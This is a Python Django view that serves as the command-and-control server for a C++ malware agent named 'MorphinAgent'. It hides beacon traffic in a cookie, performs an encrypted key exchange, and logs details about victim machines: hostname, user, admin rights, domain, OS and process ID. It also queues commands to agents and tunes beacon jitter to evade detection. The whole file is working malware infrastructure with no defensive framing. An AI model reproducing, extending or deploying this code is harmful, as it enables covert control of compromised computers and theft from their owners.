import base64
import json
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from .c2_app.models import MorphinAgent, CommandQueue

@csrf_exempt
def c2_heartbeat_handler(request):
    # 1. Extract session_id (contains Base64 packet from C++ agent)
    b64_data = request.COOKIES.get('session_id')
    if not b64_data:
        return HttpResponse("Unauthorized", status=403)

    try:
        raw_bytes = base64.b64decode(b64_data)
    except Exception:
        return HttpResponse("Invalid Encoding", status=400)

    client_ip = request.META.get('REMOTE_ADDR')

    # --- PHASE A: Handshake (Public Key Exchange) ---
    if 60 <= len(raw_bytes) <= 120:
        server_private_key = ec.generate_private_key(ec.SECP256R1())
        peer_public_key = serialization.load_der_public_key(raw_bytes)
        shared_secret = server_private_key.exchange(ec.ECDH(), peer_public_key)
        
        digest = hashes.Hash(hashes.SHA256())
        digest.update(shared_secret)
        aes_key = digest.finalize()

        temp_id = f"HS_{client_ip}"
        MorphinAgent.objects.update_or_create(
            agent_id=temp_id, 
            defaults={'shared_secret': aes_key, 'is_active': True, 'ip_addresses': client_ip}
        )

        server_pub_bytes = server_private_key.public_key().public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return HttpResponse(base64.b64encode(server_pub_bytes))

    # --- PHASE B & C: Decrypted Interaction ---
    else:
        agent = MorphinAgent.objects.filter(ip_addresses=client_ip).first()
        if not agent or not agent.shared_secret:
            return HttpResponse("Handshake Required", status=401)
        
        aesgcm = AESGCM(agent.shared_secret)
        
        try:
            iv = raw_bytes[:12]
            tag = raw_bytes[-16:]
            ciphertext = raw_bytes[12:-16]
            
            plaintext = aesgcm.decrypt(iv, ciphertext + tag, None)
            data = json.loads(plaintext.decode('utf-8'))
            
            true_id = data.get('id') or data.get('agent_id')
            if true_id and agent.agent_id != true_id:
                existing_agent = MorphinAgent.objects.filter(agent_id=true_id).first()
                if existing_agent:
                    existing_agent.shared_secret = agent.shared_secret
                    agent.delete()
                    agent = existing_agent
                else:
                    agent.agent_id = true_id
                    agent.save()
            
            # Update Discovery Info
            if 'hostname' in data: 
                agent.hostname = data.get('hostname', '')
                agent.username = data.get('username', '')
                agent.is_admin = data.get('is_admin', False)
                agent.domain = data.get('domain', '')
                agent.os_version = data.get('os', 'Windows 10')
                agent.architecture = data.get('arch', 'x64')
                agent.process_id = data.get('process_id')
                agent.ip_addresses = json.dumps(data.get('ip', [client_ip]))

            # Check for Commands
            response_payload = {"status": "alive"}
            cmd = CommandQueue.objects.filter(agent=agent, is_sent=False).first()
            if cmd:
                if cmd.command_text == "update_jitter":
                    response_payload = {"new_jitter": cmd.command_value}
                    agent.jitter_base = cmd.command_value
                cmd.is_sent = True
                cmd.save()

            agent.save() # Update last_seen timestamp

            nonce = AESGCM.generate_nonce(12)
            encrypted_resp_raw = aesgcm.encrypt(nonce, json.dumps(response_payload).encode('utf-8'), None)
            full_package = nonce + encrypted_resp_raw
            return HttpResponse(base64.b64encode(full_package))

        except Exception as e:
            return HttpResponse(f"Decryption Error: {str(e)}", status=400)